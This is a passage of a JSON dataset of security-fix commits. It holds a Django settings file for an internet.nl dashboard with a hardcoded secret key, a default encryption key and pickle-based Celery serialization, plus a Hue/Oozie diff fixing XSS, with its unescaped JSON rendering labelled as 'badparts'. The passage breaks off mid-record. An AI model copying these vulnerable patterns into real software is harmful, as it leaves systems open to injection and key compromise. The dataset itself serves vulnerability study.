'django_otp.middleware.OTPMiddleware', ] ROOT_URLCONF='dashboard.urls' TEMPLATES=[ { 'BACKEND': 'django.template.backends.django.DjangoTemplates', 'DIRS':[ BASE_DIR +'/', ], 'APP_DIRS': True, 'OPTIONS':{ 'context_processors':[ 'constance.context_processors.config', 'django.template.context_processors.debug', 'django.template.context_processors.request', 'django.contrib.auth.context_processors.auth', 'django.contrib.messages.context_processors.messages', ], }, }, ] WSGI_APPLICATION='dashboard.wsgi.application' DATABASE_OPTIONS={ 'mysql':{'init_command': \"SET character_set_connection=utf8,\" \"collation_connection=utf8_unicode_ci,\" \"sql_mode='STRICT_ALL_TABLES';\"}, } DB_ENGINE=os.environ.get('DB_ENGINE', 'mysql') DATABASE_ENGINES={ 'mysql': 'dashboard.app.backends.mysql', } DATABASES_SETTINGS={ 'dev':{ 'ENGINE': 'django.db.backends.sqlite3', 'NAME': os.environ.get('DB_NAME', 'db.sqlite3'), }, 'test':{ 'ENGINE': 'django.db.backends.sqlite3', 'NAME': os.environ.get('DB_NAME', 'db.sqlite3'), }, 'production':{ 'ENGINE': DATABASE_ENGINES.get(DB_ENGINE, 'django.db.backends.' +DB_ENGINE), 'NAME': os.environ.get('DB_NAME', 'dashboard'), 'USER': os.environ.get('DB_USER', 'dashboard'), 'PASSWORD': os.environ.get('DB_PASSWORD', 'dashboard'), 'HOST': os.environ.get('DB_HOST', 'mysql'), 'OPTIONS': DATABASE_OPTIONS.get(os.environ.get('DB_ENGINE', 'mysql'),{}) } } DATABASE=os.environ.get('DJANGO_DATABASE', 'dev') DATABASES={'default': DATABASES_SETTINGS[DATABASE]} AUTH_PASSWORD_VALIDATORS=[ { 'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator', }, { 'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator', }, { 'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator', }, { 'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator', }, ] LANGUAGE_CODE='en-us' TIME_ZONE='UTC' USE_I18N=True USE_L10N=True USE_TZ=True LOCALE_PATHS=['locale'] LANGUAGE_COOKIE_NAME='dashboard_language' STATIC_URL='/static/' if DEBUG: STATIC_ROOT='static' else: STATIC_ROOT='/srv/dashboard/static/' JET_SIDE_MENU_ITEMS=[ {'label': _('\ud83d\udd27 Configuration'), 'items':[ {'name': 'auth.user'}, {'name': 'auth.group'}, {'name': 'constance.config', 'label': _('Configuration')}, ]}, {'label': _('Dashboard'), 'items':[ {'name': 'internet_nl_dashboard.account'}, {'name': 'internet_nl_dashboard.urllist'}, {'name': 'internet_nl_dashboard.uploadlog'}, ]}, {'label': _('\ud83d\udd52 Periodic Tasks'), 'items':[ {'name': 'app.job'}, {'name': 'django_celery_beat.periodictask'}, {'name': 'django_celery_beat.crontabschedule'}, ]}, ] MEDIA_ROOT=os.environ.get('MEDIA_ROOT', os.path.abspath(os.path.dirname(__file__)) +'/uploads/') UPLOAD_ROOT=os.environ.get('MEDIA_ROOT', os.path.abspath(os.path.dirname(__file__)) +'/uploads/') LOGIN_URL=\"two_factor:login\" LOGIN_REDIRECT_URL=\"/dashboard/\" LOGOUT_REDIRECT_URL=LOGIN_URL TWO_FACTOR_QR_FACTORY='qrcode.image.pil.PilImage' TWO_FACTOR_TOTP_DIGITS=6 TWO_FACTOR_PATCH_ADMIN=True FIELD_ENCRYPTION_KEY=os.environ.get('FIELD_ENCRYPTION_KEY', b'JjvHNnFMfEaGd7Y0SAHBRNZYGGpNs7ydEp-ixmKSvkQ=') if not DEBUG and FIELD_ENCRYPTION_KEY==b'JjvHNnFMfEaGd7Y0SAHBRNZYGGpNs7ydEp-ixmKSvkQ=': raise ValueError('FIELD_ENCRYPTION_KEY has to be configured on the OS level, and needs to be different than the ' 'default key provided. Please create a new key. Instructions are listed here:' 'https://github.com/pyca/cryptography. In short, run: key=Fernet.generate_key()') LOGGING={ 'version': 1, 'disable_existing_loggers': False, 'handlers':{ 'console':{ 'class': 'logging.StreamHandler', 'formatter': 'color', }, }, 'formatters':{ 'debug':{ 'format': '%(asctime)s\\t%(levelname)-8s -%(filename)-20s:%(lineno)-4s -' '%(funcName)20s() -%(message)s', }, 'color':{ '()': 'colorlog.ColoredFormatter', 'format': '%(log_color)s%(asctime)s\\t%(levelname)-8s -' '%(message)s', 'datefmt': '%Y-%m-%d %H:%M', 'log_colors':{ 'DEBUG': 'green', 'INFO': 'white', 'WARNING': 'yellow', 'ERROR': 'red', 'CRITICAL': 'bold_red', }, } }, 'loggers':{ 'django':{ 'handlers':['console'], 'level': os.getenv('DJANGO_LOG_LEVEL', 'INFO'), }, 'dashboard':{ 'handlers':['console'], 'level': os.getenv('DJANGO_LOG_LEVEL', 'DEBUG'), }, }, } CELERY_accept_content=['pickle', 'yaml'] CELERY_task_serializer='pickle' CELERY_result_serializer='pickle' CELERY_BROKER_URL=os.environ.get('BROKER', 'redis://localhost:6379/0') ENABLE_UTC=True CELERY_ACCEPT_CONTENT=['pickle'] CELERY_TASK_SERIALIZER='pickle' CELERY_RESULT_SERIALIZER='pickle' CELERY_TIMEZONE='UTC' CELERY_BEAT_SCHEDULER='django_celery_beat.schedulers:DatabaseScheduler' CELERY_BROKER_CONNECTION_MAX_RETRIES=1 CELERY_BROKER_CONNECTION_RETRY=False CELERY_RESULT_EXPIRES=timedelta(hours=4) CELERY_WORKER_PREFETCH_MULTIPLIER=2 CELERY_WORKER_CONCURRENCY=10 CELERY_ACKS_LATE=True TOOLS={ 'organizations':{ 'import_data_dir': '', }, } OUTPUT_DIR=os.environ.get('OUTPUT_DIR', os.path.abspath(os.path.dirname(__file__)) +'/') VENDOR_DIR=os.environ.get('VENDOR_DIR', os.path.abspath(os.path.dirname(__file__) +'/../vendor/') +'/') if DEBUG: DATA_UPLOAD_MAX_NUMBER_FIELDS=10000 STATICFILES_FINDERS=( 'django.contrib.staticfiles.finders.FileSystemFinder', 'django.contrib.staticfiles.finders.AppDirectoriesFinder', 'compressor.finders.CompressorFinder', ) COMPRESS_CSS_FILTERS=['compressor.filters.cssmin.CSSCompressorFilter'] COMPRESS_STORAGE=( 'compressor.storage.GzipCompressorFileStorage' ) COMPRESS_OFFLINE=not DEBUG ", "sourceWithComments": "\"\"\"\nDjango settings for dashboard project.\n\nGenerated by 'django-admin startproject' using Django 2.1.7.\n\nFor more information on this file, see\nhttps://docs.djangoproject.com/en/2.1/topics/settings/\n\nFor the full list of settings and their values, see\nhttps://docs.djangoproject.com/en/2.1/ref/settings/\n\"\"\"\n\nimport os\nfrom datetime import timedelta\n\nfrom django.utils.translation import gettext_lazy as _\n\n# Build paths inside the project like this: os.path.join(BASE_DIR, ...)\n# BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))\nBASE_DIR = os.path.dirname(os.path.abspath(__file__))\nSETTINGS_PATH = os.path.normpath(os.path.dirname(__file__))\n\n# Quick-start development settings - unsuitable for production\n# See https://docs.djangoproject.com/en/2.1/howto/deployment/checklist/\n\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '_dzlo^9d#ox6!7c9rju@=u8+4^sprqocy3s*l*ejc2yr34@&98'\n\n# SECURITY WARNING: don't run with debug turned on in production!\nDEBUG = True\n\nALLOWED_HOSTS = []\n\n\n# Application definition\n\nINSTALLED_APPS = [\n    # Constance\n    'constance',\n    'constance.backends.database',\n\n    # Jet\n    'jet.dashboard',\n    'jet',\n\n    # Import Export\n    'import_export',\n\n    # Standard Django\n    'django.contrib.admin',\n    'django.contrib.auth',\n    'django.contrib.contenttypes',\n    'django.contrib.sessions',\n    'django.contrib.messages',\n    'django.contrib.staticfiles',\n    'django.contrib.humanize',\n\n    # Periodic tasks\n    'django_celery_beat',\n\n    # Javascript and CSS compression:\n    'compressor',\n\n    # Web Security Map (todo: minimize the subset)\n    # The reason (model) why it's included is in the comments.\n    'websecmap.app',  # Job\n    'websecmap.organizations',  # Url\n    'websecmap.scanners',  # Endpoint, EndpointGenericScan, UrlGenericScan\n    'websecmap.reporting',  # Various reporting functions (might be not needed)\n    'websecmap.map',  # because some scanners are intertwined with map configurations. That needs to go.\n    'websecmap.pro',  # some model inlines\n\n    # Custom Apps\n    # These apps overwrite whatever is declared above, for example the user information.\n    'dashboard.internet_nl_dashboard',\n\n    # Two factor auth\n    'django_otp',\n    'django_otp.plugins.otp_static',\n    'django_otp.plugins.otp_totp',\n    'two_factor',\n]\n\ntry:\n    # hack to disable django_uwsgi app as it currently conflicts with compressor\n    # https://github.com/django-compressor/django-compressor/issues/881\n    if not os.environ.get('COMPRESS', False):\n        import django_uwsgi  # NOQA\n\n        INSTALLED_APPS += ['django_uwsgi', ]\nexcept ImportError:\n    # only configure uwsgi app if installed (ie: production environment)\n    pass\n\nMIDDLEWARE = [\n    'django.middleware.security.SecurityMiddleware',\n    'django.contrib.sessions.middleware.SessionMiddleware',\n    'django.middleware.locale.LocaleMiddleware',\n    'django.middleware.common.CommonMiddleware',\n    'django.middleware.csrf.CsrfViewMiddleware',\n    'django.contrib.auth.middleware.AuthenticationMiddleware',\n    'django.contrib.messages.middleware.MessageMiddleware',\n    'django.middleware.clickjacking.XFrameOptionsMiddleware',\n\n    # Two factor Auth\n    'django_otp.middleware.OTPMiddleware',\n]\n\nROOT_URLCONF = 'dashboard.urls'\n\nTEMPLATES = [\n    {\n        'BACKEND': 'django.template.backends.django.DjangoTemplates',\n        'DIRS': [\n            BASE_DIR + '/',\n        ],\n        'APP_DIRS': True,\n        'OPTIONS': {\n            'context_processors': [\n                'constance.context_processors.config',\n                'django.template.context_processors.debug',\n                'django.template.context_processors.request',\n                'django.contrib.auth.context_processors.auth',\n                'django.contrib.messages.context_processors.messages',\n            ],\n        },\n    },\n]\n\nWSGI_APPLICATION = 'dashboard.wsgi.application'\n\n\n# Database\n# https://docs.djangoproject.com/en/2.1/ref/settings/#databases\n\nDATABASE_OPTIONS = {\n    'mysql': {'init_command': \"SET character_set_connection=utf8,\"\n                              \"collation_connection=utf8_unicode_ci,\"\n                              \"sql_mode='STRICT_ALL_TABLES';\"},\n}\nDB_ENGINE = os.environ.get('DB_ENGINE', 'mysql')\nDATABASE_ENGINES = {\n    'mysql': 'dashboard.app.backends.mysql',\n}\nDATABASES_SETTINGS = {\n    # persisten local database used during development (runserver)\n    'dev': {\n        'ENGINE': 'django.db.backends.sqlite3',\n        'NAME': os.environ.get('DB_NAME', 'db.sqlite3'),\n    },\n    # sqlite memory database for running tests without\n    'test': {\n        'ENGINE': 'django.db.backends.sqlite3',\n        'NAME': os.environ.get('DB_NAME', 'db.sqlite3'),\n    },\n    # for production get database settings from environment (eg: docker)\n    'production': {\n        'ENGINE': DATABASE_ENGINES.get(DB_ENGINE, 'django.db.backends.' + DB_ENGINE),\n        'NAME': os.environ.get('DB_NAME', 'dashboard'),\n        'USER': os.environ.get('DB_USER', 'dashboard'),\n        'PASSWORD': os.environ.get('DB_PASSWORD', 'dashboard'),\n        'HOST': os.environ.get('DB_HOST', 'mysql'),\n        'OPTIONS': DATABASE_OPTIONS.get(os.environ.get('DB_ENGINE', 'mysql'), {})\n    }\n}\n# allow database to be selected through environment variables\nDATABASE = os.environ.get('DJANGO_DATABASE', 'dev')\nDATABASES = {'default': DATABASES_SETTINGS[DATABASE]}\n\n\n# Password validation\n# https://docs.djangoproject.com/en/2.1/ref/settings/#auth-password-validators\n\nAUTH_PASSWORD_VALIDATORS = [\n    {\n        'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator',\n    },\n]\n\n\n# Internationalization\n# https://docs.djangoproject.com/en/2.1/topics/i18n/\n\nLANGUAGE_CODE = 'en-us'\n\nTIME_ZONE = 'UTC'\n\nUSE_I18N = True\n\nUSE_L10N = True\n\nUSE_TZ = True\n\nLOCALE_PATHS = ['locale']\n\nLANGUAGE_COOKIE_NAME = 'dashboard_language'\n\n\n# Static files (CSS, JavaScript, Images)\n# https://docs.djangoproject.com/en/2.1/howto/static-files/\n\nSTATIC_URL = '/static/'\n\n# Absolute path to aggregate to and serve static file from.\nif DEBUG:\n    STATIC_ROOT = 'static'\nelse:\n    STATIC_ROOT = '/srv/dashboard/static/'\n\n\nJET_SIDE_MENU_ITEMS = [\n\n    {'label': _('\ud83d\udd27 Configuration'), 'items': [\n        {'name': 'auth.user'},\n        {'name': 'auth.group'},\n        {'name': 'constance.config', 'label': _('Configuration')},\n    ]},\n\n    {'label': _('Dashboard'), 'items': [\n        {'name': 'internet_nl_dashboard.account'},\n        {'name': 'internet_nl_dashboard.urllist'},\n        {'name': 'internet_nl_dashboard.uploadlog'},\n    ]},\n\n    {'label': _('\ud83d\udd52 Periodic Tasks'), 'items': [\n        {'name': 'app.job'},\n        {'name': 'django_celery_beat.periodictask'},\n        {'name': 'django_celery_beat.crontabschedule'},\n    ]},\n\n]\n\nMEDIA_ROOT = os.environ.get('MEDIA_ROOT', os.path.abspath(os.path.dirname(__file__)) + '/uploads/')\nUPLOAD_ROOT = os.environ.get('MEDIA_ROOT', os.path.abspath(os.path.dirname(__file__)) + '/uploads/')\n\n\n# Two factor auth\nLOGIN_URL = \"two_factor:login\"\nLOGIN_REDIRECT_URL = \"/dashboard/\"\nLOGOUT_REDIRECT_URL = LOGIN_URL\nTWO_FACTOR_QR_FACTORY = 'qrcode.image.pil.PilImage'\n# 6 supports google authenticator\nTWO_FACTOR_TOTP_DIGITS = 6\nTWO_FACTOR_PATCH_ADMIN = True\n\n# Encrypted fields\n# Note that this key is not stored in the database. As... well if you have the database, you have the key.\nFIELD_ENCRYPTION_KEY = os.environ.get('FIELD_ENCRYPTION_KEY', b'JjvHNnFMfEaGd7Y0SAHBRNZYGGpNs7ydEp-ixmKSvkQ=')\n\nif not DEBUG and FIELD_ENCRYPTION_KEY == b'JjvHNnFMfEaGd7Y0SAHBRNZYGGpNs7ydEp-ixmKSvkQ=':\n    raise ValueError('FIELD_ENCRYPTION_KEY has to be configured on the OS level, and needs to be different than the '\n                     'default key provided. Please create a new key. Instructions are listed here:'\n                     'https://github.com/pyca/cryptography. In short, run: key = Fernet.generate_key()')\n\nLOGGING = {\n    'version': 1,\n    'disable_existing_loggers': False,\n    'handlers': {\n        'console': {\n            'class': 'logging.StreamHandler',  # sys.stdout\n            'formatter': 'color',\n        },\n    },\n    'formatters': {\n        'debug': {\n            'format': '%(asctime)s\\t%(levelname)-8s - %(filename)-20s:%(lineno)-4s - '\n                      '%(funcName)20s() - %(message)s',\n        },\n        'color': {\n            '()': 'colorlog.ColoredFormatter',\n            'format': '%(log_color)s%(asctime)s\\t%(levelname)-8s - '\n                      '%(message)s',\n            'datefmt': '%Y-%m-%d %H:%M',\n            'log_colors': {\n                'DEBUG': 'green',\n                'INFO': 'white',\n                'WARNING': 'yellow',\n                'ERROR': 'red',\n                'CRITICAL': 'bold_red',\n            },\n        }\n    },\n    'loggers': {\n        # Used when there is no log defined or loaded. Disabled given we always use __package__ to log.\n        # Would you enable it, all logging messages will be logged twice.\n        # '': {\n        #     'handlers': ['console'],\n        #     'level': os.getenv('DJANGO_LOG_LEVEL', 'DEBUG'),\n        # },\n\n        # Default Django logging, we expect django to work, and therefore only show INFO messages.\n        # It can be smart to sometimes want to see what's going on here, but not all the time.\n        # https://docs.djangoproject.com/en/2.1/topics/logging/#django-s-logging-extensions\n        'django': {\n            'handlers': ['console'],\n            'level': os.getenv('DJANGO_LOG_LEVEL', 'INFO'),\n        },\n\n        # We expect to be able to debug websecmap all of the time.\n        'dashboard': {\n            'handlers': ['console'],\n            'level': os.getenv('DJANGO_LOG_LEVEL', 'DEBUG'),\n        },\n    },\n}\n\n\n# settings to get WebSecMap to work:\n# Celery 4.0 settings\n# Pickle can work, but you need to use certificates to communicate (to verify the right origin)\n# It's preferable not to use pickle, yet it's overly convenient as the normal serializer can not\n# even serialize dicts.\n# http://docs.celeryproject.org/en/latest/userguide/configuration.html\nCELERY_accept_content = ['pickle', 'yaml']\nCELERY_task_serializer = 'pickle'\nCELERY_result_serializer = 'pickle'\n\n\n# Celery config\nCELERY_BROKER_URL = os.environ.get('BROKER', 'redis://localhost:6379/0')\nENABLE_UTC = True\n\n# Any data transfered with pickle needs to be over tls... you can inject arbitrary objects with\n# this stuff... message signing makes it a bit better, not perfect as it peels the onion.\n# this stuff... message signing makes it a bit better, not perfect as it peels the onion.\n# see: https://blog.nelhage.com/2011/03/exploiting-pickle/\n# Yet pickle is the only convenient way of transporting objects without having to lean in all kinds\n# of directions to get the job done. Intermediate tables to store results could be an option.\nCELERY_ACCEPT_CONTENT = ['pickle']\nCELERY_TASK_SERIALIZER = 'pickle'\nCELERY_RESULT_SERIALIZER = 'pickle'\nCELERY_TIMEZONE = 'UTC'\n\nCELERY_BEAT_SCHEDULER = 'django_celery_beat.schedulers:DatabaseScheduler'\n\nCELERY_BROKER_CONNECTION_MAX_RETRIES = 1\nCELERY_BROKER_CONNECTION_RETRY = False\nCELERY_RESULT_EXPIRES = timedelta(hours=4)\n\n# Use the value of 2 for celery prefetch multiplier. Previous was 1. The\n# assumption is that 1 will block a worker thread until the current (rate\n# limited) task is completed. When using 2 (or higher) the assumption is that\n# celery will drop further rate limited task from the internal worker queue and\n# fetch other tasks tasks that could be executed (spooling other rate limited\n# tasks through in the process but to no hard except for a slight drop in\n# overall throughput/performance). A to high value for the prefetch multiplier\n# might result in high priority tasks not being picked up as Celery does not\n# seem to do prioritisation in worker queues but only on the broker\n# queues. The value of 2 is currently selected because it higher than 1,\n# behaviour needs to be observed to decide if raising this results in\n# further improvements without impacting the priority feature.\nCELERY_WORKER_PREFETCH_MULTIPLIER = 2\n\n# numer of tasks to be executed in parallel by celery\nCELERY_WORKER_CONCURRENCY = 10\n\n# Workers will scale up and scale down depending on the number of tasks\n# available. To prevent workers from scaling down while still doing work,\n# the ACKS_LATE setting is used. This insures that a task is removed from\n# the task queue after the task is performed. This might result in some\n# issues where tasks that don't finish or crash keep being executed:\n# thus for tasks that are not programmed perfectly it will raise a number\n# of repeated exceptions which will need to be debugged.\nCELERY_ACKS_LATE = True\n\nTOOLS = {\n    'organizations': {\n        'import_data_dir': '',\n    },\n}\n\nOUTPUT_DIR = os.environ.get('OUTPUT_DIR', os.path.abspath(os.path.dirname(__file__)) + '/')\nVENDOR_DIR = os.environ.get('VENDOR_DIR', os.path.abspath(os.path.dirname(__file__) + '/../vendor/') + '/')\n\nif DEBUG:\n    # too many sql variables....\n    DATA_UPLOAD_MAX_NUMBER_FIELDS = 10000\n\n\n# Compression\n# Django-compressor is used to compress css and js files in production\n# During development this is disabled as it does not provide any feature there\n# Django-compressor configuration defaults take care of this.\n# https://django-compressor.readthedocs.io/en/latest/usage/\n# which plugins to use to find static files\nSTATICFILES_FINDERS = (\n    # default static files finders\n    'django.contrib.staticfiles.finders.FileSystemFinder',\n    'django.contrib.staticfiles.finders.AppDirectoriesFinder',\n    # other finders..\n    'compressor.finders.CompressorFinder',\n)\n\nCOMPRESS_CSS_FILTERS = ['compressor.filters.cssmin.CSSCompressorFilter']\n\n# Slimit doesn't work with vue. Tried two versions. Had to rewrite some other stuff.\n# Now using the default, so not explicitly adding that to the settings\n# COMPRESS_JS_FILTERS = ['compressor.filters.jsmin.JSMinFilter']\n\n# Brotli compress storage gives some issues.\n# This creates the original compressed and a gzipped compressed file.\nCOMPRESS_STORAGE = (\n    'compressor.storage.GzipCompressorFileStorage'\n)\n\n# Enable static file (js/css) compression when not running debug\n# https://django-compressor.readthedocs.io/en/latest/settings/#django.conf.settings.COMPRESS_OFFLINE\nCOMPRESS_OFFLINE = not DEBUG\n# https://django-compressor.readthedocs.io/en/latest/settings/#django.conf.settings.COMPRESS_ENABLED\n# Enabled when debug is off by default.\n"}}, "msg": "Add spreadsheet with XSS attacks, icon to dashboard and status to upload in admin"}}, "https://github.com/boc-bdp/goumang": {"6641c62beaa1468082e47d82da5ed758d11c7735": {"url": "https://api.github.com/repos/boc-bdp/goumang/commits/6641c62beaa1468082e47d82da5ed758d11c7735", "html_url": "https://github.com/boc-bdp/goumang/commit/6641c62beaa1468082e47d82da5ed758d11c7735", "message": "[oozie] Protect against XSS in the editor", "sha": "6641c62beaa1468082e47d82da5ed758d11c7735", "keyword": "XSS protect", "diff": "diff --git a/apps/oozie/src/oozie/models2.py b/apps/oozie/src/oozie/models2.py\nindex c9dd546b72..f3f5cce5af 100644\n--- a/apps/oozie/src/oozie/models2.py\n+++ b/apps/oozie/src/oozie/models2.py\n@@ -26,6 +26,7 @@\n from string import Template\n \n from django.utils.encoding import force_unicode\n+from desktop.lib.json_utils import JSONEncoderForHTML\n from django.utils.translation import ugettext as _\n \n from desktop.lib import django_mako\n@@ -1381,14 +1382,13 @@ def id(self):\n   def uuid(self):\n     return self.document.uuid\n \n-  @property\n-  def json(self):\n+  def json_for_html(self):\n     _data = self.data.copy()\n \n     _data['properties']['start'] = _data['properties']['start'].strftime('%Y-%m-%dT%H:%M:%S')\n     _data['properties']['end'] = _data['properties']['end'].strftime('%Y-%m-%dT%H:%M:%S')\n \n-    return json.dumps(_data)\n+    return json.dumps(_data, cls=JSONEncoderForHTML)\n  \n   @property\n   def data(self):\n@@ -1597,13 +1597,12 @@ def id(self):\n   def uuid(self):\n     return self.document.uuid\n \n-  @property\n-  def json(self):\n+  def json_for_html(self):\n     _data = self.data.copy()\n \n     _data['properties']['kickoff'] = _data['properties']['kickoff'].strftime('%Y-%m-%dT%H:%M:%S')\n \n-    return json.dumps(_data)\n+    return json.dumps(_data, cls=JSONEncoderForHTML)\n  \n   @property\n   def data(self):\ndiff --git a/apps/oozie/src/oozie/views/editor2.py b/apps/oozie/src/oozie/views/editor2.py\nindex c2b5f66917..215dc77158 100644\n--- a/apps/oozie/src/oozie/views/editor2.py\n+++ b/apps/oozie/src/oozie/views/editor2.py\n@@ -29,6 +29,7 @@\n from desktop.lib.exceptions_renderable import PopupException\n from desktop.lib.i18n import smart_str\n from desktop.lib.rest.http_client import RestException\n+from desktop.lib.json_utils import JSONEncoderForHTML\n from desktop.models import Document, Document2\n \n from liboozie.credentials import Credentials\n@@ -49,7 +50,7 @@ def list_editor_workflows(request):\n   workflows = [d.content_object.to_dict() for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')]\n \n   return render('editor/list_editor_workflows.mako', request, {\n-      'workflows_json': json.dumps(workflows)\n+      'workflows_json': json.dumps(workflows, cls=JSONEncoderForHTML)\n   })\n \n \n@@ -82,12 +83,12 @@ def edit_workflow(request):\n     LOG.error(smart_str(e))\n \n   return render('editor/workflow_editor.mako', request, {\n-      'layout_json': json.dumps(workflow_data['layout']),\n-      'workflow_json': json.dumps(workflow_data['workflow']),\n-      'credentials_json': json.dumps(credentials.credentials.keys()),\n-      'workflow_properties_json': json.dumps(WORKFLOW_NODE_PROPERTIES),\n+      'layout_json': json.dumps(workflow_data['layout'], cls=JSONEncoderForHTML),\n+      'workflow_json': json.dumps(workflow_data['workflow'], cls=JSONEncoderForHTML),\n+      'credentials_json': json.dumps(credentials.credentials.keys(), cls=JSONEncoderForHTML),\n+      'workflow_properties_json': json.dumps(WORKFLOW_NODE_PROPERTIES, cls=JSONEncoderForHTML),\n       'doc1_id': doc.doc.get().id if doc else -1,\n-      'subworkflows_json': json.dumps(_get_workflows(request.user)),\n+      'subworkflows_json': json.dumps(_get_workflows(request.user), cls=JSONEncoderForHTML),\n       'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))\n   })\n \n@@ -373,9 +374,9 @@ def edit_coordinator(request):\n     raise PopupException(_('You don\\'t have access to the workflow of this coordinator.'))\n \n   return render('editor/coordinator_editor.mako', request, {\n-      'coordinator_json': coordinator.json,\n-      'credentials_json': json.dumps(credentials.credentials.keys()),\n-      'workflows_json': json.dumps(workflows),\n+      'coordinator_json': coordinator.json_for_html(),\n+      'credentials_json': json.dumps(credentials.credentials.keys(), cls=JSONEncoderForHTML),\n+      'workflows_json': json.dumps(workflows, cls=JSONEncoderForHTML),\n       'doc1_id': doc.doc.get().id if doc else -1,\n       'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))\n   })\n@@ -497,8 +498,8 @@ def edit_bundle(request):\n                       for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')]\n \n   return render('editor/bundle_editor.mako', request, {\n-      'bundle_json': bundle.json,\n-      'coordinators_json': json.dumps(coordinators),\n+      'bundle_json': bundle.json_for_html(),\n+      'coordinators_json': json.dumps(coordinators, cls=JSONEncoderForHTML),\n       'doc1_id': doc.doc.get().id if doc else -1,\n       'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))      \n   })\n", "files": {"/apps/oozie/src/oozie/models2.py": {"changes": [{"diff": "\n   def uuid(self):\n     return self.document.uuid\n \n-  @property\n-  def json(self):\n+  def json_for_html(self):\n     _data = self.data.copy()\n \n     _data['properties']['start'] = _data['properties']['start'].strftime('%Y-%m-%dT%H:%M:%S')\n     _data['properties']['end'] = _data['properties']['end'].strftime('%Y-%m-%dT%H:%M:%S')\n \n-    return json.dumps(_data)\n+    return json.dumps(_data, cls=JSONEncoderForHTML)\n  \n   @property\n   def data(self):\n", "add": 2, "remove": 3, "filename": "/apps/oozie/src/oozie/models2.py", "badparts": ["  @property", "  def json(self):", "    return json.dumps(_data)"], "goodparts": ["  def json_for_html(self):", "    return json.dumps(_data, cls=JSONEncoderForHTML)"]}, {"diff": "\n   def uuid(self):\n     return self.document.uuid\n \n-  @property\n-  def json(self):\n+  def json_for_html(self):\n     _data = self.data.copy()\n \n     _data['properties']['kickoff'] = _data['properties']['kickoff'].strftime('%Y-%m-%dT%H:%M:%S')\n \n-    return json.dumps(_data)\n+    return json.dumps(_data, cls=JSONEncoderForHTML)\n  \n   @property\n   def data(self):", "add": 2, "remove": 3, "filename": "/apps/oozie/src/oozie/models2.py", "badparts": ["  @property", "  def json(self):", "    return json.dumps(_data)"], "goodparts": ["  def json_for_html(self):", "    return json.dumps(_data, cls=JSONEncoderForHTML)"]}]}, "/apps/oozie/src/oozie/views/editor2.py": {"changes": [{"diff": "\n   workflows = [d.content_object.to_dict() for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')]\n \n   return render('editor/list_editor_workflows.mako', request, {\n-      'workflows_json': json.dumps(workflows)\n+      'workflows_json': json.dumps(workflows, cls=JSONEncoderForHTML)\n   })\n \n \n", "add": 1, "remove": 1, "filename": "/apps/oozie/src/oozie/views/editor2.py", "badparts": ["      'workflows_json': json.dumps(workflows)"], "goodparts": ["      'workflows_json': json.dumps(workflows, cls=JSONEncoderForHTML)"]}, {"diff": "\n     LOG.error(smart_str(e))\n \n   return render('editor/workflow_editor.mako', request, {\n-      'layout_json': json.dumps(workflow_data['layout']),\n-      'workflow_json': json.dumps(workflow_data['workflow']),\n-      'credentials_json': json.dumps(credentials.credentials.keys()),\n-      'workflow_properties_json': json.dumps(WORKFLOW_NODE_PROPERTIES),\n+      'layout_json': json.dumps(workflow_data['layout'], cls=JSONEncoderForHTML),\n+      'workflow_json': json.dumps(workflow_data['workflow'], cls=JSONEncoderForHTML),\n+      'credentials_json': json.dumps(credentials.credentials.keys(), cls=JSONEncoderForHTML),\n+      'workflow_properties_json': json.dumps(WORKFLOW_NODE_PROPERTIES, cls=JSONEncoderForHTML),\n       'doc1_id': doc.doc.get().id if doc else -1,\n-      'subworkflows_json': json.dumps(_get_workflows(request.user)),\n+      'subworkflows_json': json.dumps(_get_workflows(request.user), cls=JSONEncoderForHTML),\n       'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))\n   })\n \n", "add": 5, "remove": 5, "filename": "/apps/oozie/src/oozie/views/editor2.py", "badparts": ["      'layout_json': json.dumps(workflow_data['layout']),", "      'workflow_json': json.dumps(workflow_data['workflow']),", "      'credentials_json': json.dumps(credentials.credentials.keys()),", "      'workflow_properties_json': json.dumps(WORKFLOW_NODE_PROPERTIES),", "      'subworkflows_json': json.dumps(_get_workflows(request.user)),"], "goodparts": ["      'layout_json': json.dumps(workflow_data['layout'], cls=JSONEncoderForHTML),", "      'workflow_json': json.dumps(workflow_data['workflow'], cls=JSONEncoderForHTML),", "      'credentials_json': json.dumps(credentials.credentials.keys(), cls=JSONEncoderForHTML),", "      'workflow_properties_json': json.dumps(WORKFLOW_NODE_PROPERTIES, cls=JSONEncoderForHTML),", "      'subworkflows_json': json.dumps(_get_workflows(request.user), cls=JSONEncoderForHTML),"]}, {"diff": "\n     raise PopupException(_('You don\\'t have access to the workflow of this coordinator.'))\n \n   return render('editor/coordinator_editor.mako', request, {\n-      'coordinator_json': coordinator.json,\n-      'credentials_json': json.dumps(credentials.credentials.keys()),\n-      'workflows_json': json.dumps(workflows),\n+      'coordinator_json': coordinator.json_for_html(),\n+      'credentials_json': json.dumps(credentials.credentials.keys(), cls=JSONEncoderForHTML),\n+      'workflows_json': json.dumps(workflows, cls=JSONEncoderForHTML),\n       'doc1_id': doc.doc.get().id if doc else -1,\n       'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))\n   })\n", "add": 3, "remove": 3, "filename": "/apps/oozie/src/oozie/views/editor2.py", "badparts": ["      'coordinator_json': coordinator.json,", "      'credentials_json': json.dumps(credentials.credentials.keys()),", "      'workflows_json': json.dumps(workflows),"], "goodparts": ["      'coordinator_json': coordinator.json_for_html(),", "      'credentials_json': json.dumps(credentials.credentials.keys(), cls=JSONEncoderForHTML),", "      'workflows_json': json.dumps(workflows, cls=JSONEncoderForHTML),"]}, {"diff": "\n                       for d in 